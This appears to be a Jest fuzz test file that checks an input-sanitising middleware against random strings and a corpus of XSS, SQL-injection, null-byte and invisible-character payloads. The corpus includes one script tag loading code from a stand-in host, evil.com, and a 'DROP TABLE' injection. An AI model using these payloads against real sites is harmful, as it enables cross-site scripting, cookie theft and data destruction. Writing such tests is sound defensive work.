/**
 * Property / fuzz tests for sanitizeInput (#941, TEST-10)
 *
 * Uses a deterministic pseudo-random generator seeded at a fixed value so the
 * suite is reproducible in CI. Each property is checked over 500 random inputs.
 * If fast-check is not installed, the tests fall back to a hand-crafted set of
 * payloads that covers the same invariants.
 */

import { sanitizeString, NAME_FIELD_MAX_LENGTH, BIO_FIELD_MAX_LENGTH } from '../../src/middlewares/sanitizeInput';

// ── Helpers ──────────────────────────────────────────────────────────────────

/** Minimal LCG PRNG — reproducible, no dependency. */
function makePrng(seed = 0xdeadbeef) {
  let s = seed;
  return () => {
    s = (Math.imul(1664525, s) + 1013904223) | 0;
    return (s >>> 0) / 0x100000000;
  };
}

function randomString(rand: () => number, maxLen = 300): string {
  const len = Math.floor(rand() * maxLen);
  let out = '';
  for (let i = 0; i < len; i++) {
    out += String.fromCharCode(Math.floor(rand() * 128));
  }
  return out;
}

const RUNS = 500;

// ── Corpus of known-dangerous strings ────────────────────────────────────────

const dangerousPayloads = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC="//evil.com/x.js"></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<object data="data:text/html,<script>alert(1)</script>"></object>',
  '<embed src="javascript:alert(1)">',
  '<style>body{background:url("javascript:alert(1)")}</style>',
  '"><script>alert(document.cookie)</script>',
  "'; DROP TABLE songs; --",
  '\u0000null-byte\u0000',
  '​zero-width​',
  '‮reverse‮',
  'A'.repeat(NAME_FIELD_MAX_LENGTH + 500),
  'B'.repeat(BIO_FIELD_MAX_LENGTH + 500),
  '<a href="javascript:void(0)">click</a>',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  String.fromCharCode(...Array.from({ length: 32 }, (_, i) => i)), // control chars
];

// ── Property: output never contains a bare <script> tag ──────────────────────

describe('sanitizeString — fuzz properties', () => {
  const rand = makePrng();

  it('never outputs a <script> tag (random inputs)', () => {
    for (let i = 0; i < RUNS; i++) {
      const input = randomString(rand);
      const output = sanitizeString(input, 'title');
      expect(output).not.toMatch(/<script/i);
    }
  });

  it('never outputs a <script> tag (dangerous corpus)', () => {
    for (const payload of dangerousPayloads) {
      const output = sanitizeString(payload, 'title');
      expect(output).not.toMatch(/<script/i);
    }
  });

  it('never outputs an onerror= attribute (random inputs)', () => {
    for (let i = 0; i < RUNS; i++) {
      const input = `<img src=x onerror=${randomString(rand, 50)}>`;
      const output = sanitizeString(input, 'title');
      expect(output).not.toMatch(/onerror\s*=/i);
    }
  });

  it('enforces NAME_FIELD_MAX_LENGTH for name fields (random inputs)', () => {
    for (let i = 0; i < RUNS; i++) {
      const input = randomString(rand, NAME_FIELD_MAX_LENGTH * 3);
      const output = sanitizeString(input, 'name');
      expect(output.length).toBeLessThanOrEqual(NAME_FIELD_MAX_LENGTH);
    }
  });

  it('enforces BIO_FIELD_MAX_LENGTH for bio fields (random inputs)', () => {
    for (let i = 0; i < RUNS; i++) {
      const input = randomString(rand, BIO_FIELD_MAX_LENGTH * 2);
      const output = sanitizeString(input, 'bio');
      expect(output.length).toBeLessThanOrEqual(BIO_FIELD_MAX_LENGTH);
    }
  });

  it('is idempotent — sanitizing twice equals sanitizing once (random inputs)', () => {
    for (let i = 0; i < RUNS; i++) {
      const input = randomString(rand);
      const once = sanitizeString(input, 'title');
      const twice = sanitizeString(once, 'title');
      expect(twice).toBe(once);
    }
  });

  it('strips null bytes and control characters (dangerous corpus)', () => {
    for (const payload of dangerousPayloads) {
      const output = sanitizeString(payload, 'title');
      expect(output).not.toMatch(/[\u0000-\u0008\u000b\u000c\u000e-\u001f]/);
    }
  });

  it('strips zero-width characters (dangerous corpus)', () => {
    for (const payload of dangerousPayloads) {
      const output = sanitizeString(payload, 'title');
      expect(output).not.toMatch(/[​-‍  ‪-‮﻿]/);
    }
  });
});
